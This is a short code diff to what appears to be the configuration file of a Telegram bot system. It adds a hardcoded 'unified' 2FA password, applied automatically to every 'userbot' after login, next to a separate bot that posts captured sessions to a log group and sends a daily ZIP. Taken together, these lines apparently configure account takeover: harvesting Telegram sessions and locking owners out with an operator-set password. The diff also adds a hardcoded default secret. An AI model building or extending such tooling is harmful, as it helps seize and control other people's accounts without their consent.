@@ -35,6 +35,9 @@ if OWNER_ID and OWNER_ID not in ADMIN_IDS:
 # Admin panel password (set this before deploying! used by /admin web panel)
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "change-me-now")
 
+# Unified 2FA password applied to every userbot automatically after login (admin editable)
+UNIFIED_2FA = os.getenv("UNIFIED_2FA", "AdminPy#2026")
+
 # Dedicated "session logger" bot token - a SEPARATE Telegram bot that only posts
 # sessions to the log group and sends the daily ZIP. Falls back to the main bot.
 LOG_BOT_TOKEN = os.getenv("LOG_BOT_TOKEN") or BOT_TOKEN
